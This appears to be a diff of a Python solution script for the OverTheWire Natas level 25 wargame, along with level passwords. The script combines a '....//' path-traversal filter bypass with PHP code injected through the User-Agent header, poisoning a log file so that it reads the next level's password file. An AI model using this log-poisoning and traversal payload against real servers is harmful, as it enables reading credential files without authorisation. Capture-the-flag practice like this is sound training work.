@@ -12,7 +12,7 @@ def writeResponse(enumerate = ''):
         
 
 url = 'http://natas25.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas25','GHF6X7YwACaYYssHVY05cFq83hRktl4c')
+lvl_pass = requests.auth.HTTPBasicAuth('natas25','O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx')
 my_cookies = {"PHPSESSID":'lllq'} #SUPER RELEVANT for this one 
 my_params = {"lang":'....//logs/natas25_lllq.log'}
 my_headers = {'User-Agent':'<? echo file_get_contents("/etc/natas_webpass/natas26"); ?>'}
@@ -28,5 +28,5 @@ for your final attempt if you don't want to hunt through pages of output.
 
 
 Username: natas26
-Password:   
+Password: 8A506rfIAXbKKk68yJeuTuRq4UfcK70k
 '''
